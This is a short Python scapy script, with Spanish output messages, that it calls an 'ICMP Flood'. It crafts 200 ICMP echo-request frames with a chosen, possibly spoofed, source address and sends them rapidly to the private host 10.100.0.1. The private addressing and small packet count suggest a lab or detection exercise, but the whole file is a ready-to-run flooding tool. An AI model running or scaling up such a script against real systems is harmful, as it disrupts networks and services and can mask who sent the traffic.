#!/usr/bin/env python3
from scapy.all import *
iface = "ens4"
src = "172.16.0.10"
target = "10.100.0.1"
print(f"[*] ICMP Flood: {src} -> {target}")
pkts = [Ether()/IP(src=src, dst=target)/ICMP(type=8)
        for _ in range(200)]
sendp(pkts, iface=iface, verbose=False, inter=0.005)
print(f"[+] Enviados {len(pkts)} paquetes ICMP")